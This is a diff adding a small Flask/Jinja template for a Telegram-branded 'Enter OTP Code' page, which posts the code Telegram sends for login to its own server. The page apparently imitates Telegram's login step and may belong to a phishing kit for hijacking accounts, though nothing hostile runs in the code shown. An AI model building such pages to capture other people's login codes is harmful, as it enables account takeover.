@@ -1,0 +1,38 @@
+{% extends "layout.html" %} {% block content %}
+<div class="container">
+  <img
+    src="{{ url_for('static', filename='otp.png') }}"
+    class="logo"
+    alt="Telegram"
+  />
+  <h2>Enter OTP Code</h2>
+  <p class="subtitle">We sent a code to your Telegram app</p>
+
+  <form method="POST">
+    <label for="otp">OTP Code</label>
+    <input
+      type="text"
+      name="otp"
+      id="otp"
+      placeholder="Enter 5-digit code"
+      required
+      maxlength="6"
+    />
+
+    <button type="submit">Verify</button>
+  </form>
+
+  <p class="footer-text">
+    Didn’t receive the code? Wait a few seconds and try again.
+  </p>
+</div>
+
+<script>
+  const otpInput = document.getElementById("otp");
+
+  // Hanya boleh angka
+  otpInput.addEventListener("input", function () {
+    this.value = this.value.replace(/\D/g, ""); // hapus non-digit
+  });
+</script>
+{% endblock %}
